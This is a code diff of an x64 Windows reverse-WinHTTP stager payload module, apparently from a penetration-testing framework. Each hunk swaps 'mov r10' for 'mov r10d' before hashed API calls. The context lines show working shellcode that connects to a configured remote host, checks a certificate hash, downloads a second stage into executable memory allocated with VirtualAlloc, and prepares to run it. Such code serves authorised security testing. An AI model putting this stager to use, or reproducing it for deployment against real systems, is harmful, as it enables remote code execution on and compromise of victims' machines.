@@ -206,7 +206,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r14, 'winhttp'
         push r14                      ; Push 'winhttp',0 onto the stack
         mov rcx, rsp                  ; lpFileName (stackpointer)
-        mov r10, #{block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
+        mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
         call rbp
     ^
 
@@ -217,7 +217,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r14, 'crypt32'
         push r14                      ; Push 'crypt32',0 onto the stack
         mov rcx, rsp                  ; lpFileName (stackpointer)
-        mov r10, #{block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
+        mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
         call rbp
       ^
     end
@@ -250,7 +250,7 @@ module Payload::Windows::ReverseWinHttp_x64
         xor r9, r9                    ; pwszProxyBypass (NULL)
         push rbx                      ; stack alignment
         push rbx                      ; dwFlags (0)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpOpen')}; WinHttpOpen
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpOpen')}; WinHttpOpen
         call rbp
     ^
 
@@ -268,7 +268,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rcx, rax                  ; hSession
         mov r8, #{opts[:port]}        ; nServerPort
         xor r9, r9                    ; dwReserved
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpConnect')} ; WinHttpConnect
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpConnect')} ; WinHttpConnect
         call rbp
 
         call winhttpopenrequest
@@ -306,7 +306,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push rax
         push rbx                      ; lppwszAcceptType (NULL)
         push rbx                      ; pwszReferer (NULL)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpOpenRequest')} ; WinHttpOpenRequest
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpOpenRequest')} ; WinHttpOpenRequest
         call rbp
 
       prepare:
@@ -323,7 +323,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rdx, 0x1002               ; (0x1002=WINHTTP_OPTION_PROXY_USERNAME)
         push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
         pop r9
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
       ^
     end
@@ -338,7 +338,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rdx, 0x1003               ; (0x1003=WINHTTP_OPTION_PROXY_PASSWORD)
         push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
         pop r9
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
       ^
     end
@@ -350,7 +350,7 @@ module Payload::Windows::ReverseWinHttp_x64
         sub rax, 32
         mov rdi, rsp                  ; save a pointer to this buffer
         mov rcx, rdi                  ; this buffer is also the parameter to the function
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')} ; WinHttpGetIEProxyConfigForCurrentUser
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')} ; WinHttpGetIEProxyConfigForCurrentUser
         call rbp
 
         test eax, eax                 ; skip the rest of the proxy stuff if the call failed
@@ -386,7 +386,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rdx, r13                  ; lpcwszUrl
 
         ; finally make the call
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')} ; WinHttpGetProxyForUrl
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')} ; WinHttpGetProxyForUrl
         call rbp
 
         test eax, eax                 ; skip the rest of the proxy stuff if the call failed
@@ -413,7 +413,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rcx, rsi                  ; hConnection (connection handle)
         push 38
         pop rdx                       ; (38=WINHTTP_OPTION_PROXY)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
 
       ie_proxy_setup_finish:
@@ -440,7 +440,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r8, rsp                   ; lpBuffer (pointer to flags)
         push 4
         pop r9                        ; dwBufferLength (4 = size of flags)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
 
         xor r8, r8                    ; dwHeadersLen (0)
@@ -470,7 +470,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push rbx                      ; dwContext (0)
         push rbx                      ; dwTotalLength (0)
         push rbx                      ; dwOptionalLength (0)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpSendRequest')} ; WinHttpSendRequest
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpSendRequest')} ; WinHttpSendRequest
         call rbp
         test eax, eax
         jnz handle_response
@@ -498,7 +498,7 @@ module Payload::Windows::ReverseWinHttp_x64
       asm << %Q^
       failure:
         ; hard-coded to ExitProcess(whatever) for size
-        mov r10, #{block_api_hash('kernel32.dll', 'ExitProcess')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp                      ; ExitProcess(whatever)
       ^
     end
@@ -508,7 +508,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rcx, rsi                  ; hRequest
         push rbx
         pop rdx                       ; lpReserved (NULL)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')} ; WinHttpReceiveResponse
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')} ; WinHttpReceiveResponse
         call rbp
         test eax, eax                 ; make sure the request succeeds
         jz failure
@@ -528,7 +528,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push rbx                      ; 0 for alignment
         push 8                        ; One whole pointer
         mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
         call rbp
         test eax, eax                 ; use eax instead of rax, saves a byte
         jz failure                    ; Bail out if we couldn't get the certificate context
@@ -543,7 +543,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r14, r8                   ; Back the stack pointer up for later use
         push 3
         pop rdx                       ; CERT_SHA1_HASH_PROP_ID (dwPropId)
-        mov r10, #{block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
+        mov r10d, #{block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
         call rbp
         test eax, eax                 ; use eax instead of rax, saves a byte
         jz failure                    ; Bail out if we couldn't get the certificate context
@@ -575,7 +575,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push 4
         pop r8                        ; dwNumberOfBytesToRead (4 bytes)
         mov rcx, rsi                  ; hFile (request handle)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
         call rbp
         test eax, eax                 ; did the download fail?
         jz failure
@@ -590,7 +590,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push 0x40
         pop r9                        ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
-        mov r10, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
 
         ;download stage
@@ -603,7 +603,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r8, rax                   ; dwNumberOfBytesToRead (incoming stage size)
         mov rdx, rbx                  ; lpBuffer (pointer to mem)
         mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
         call rbp
         add rsp, 32                   ; clean up reserved space
         test eax, eax                 ; did the download fail?
@@ -620,7 +620,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
         shl edx, 16                   ; dwSize
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
-        mov r10, #{block_api_hash('kernel32.dll', 'VirtualAlloc')} ; VirtualAlloc
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')} ; VirtualAlloc
         call rbp
 
       download_prep:
@@ -634,7 +634,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov rdx, rbx                  ; lpBuffer (pointer to mem)
         mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
         mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
-        mov r10, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
+        mov r10d, #{block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
         call rbp
         add rsp, 32                   ; clean up reserved space
 
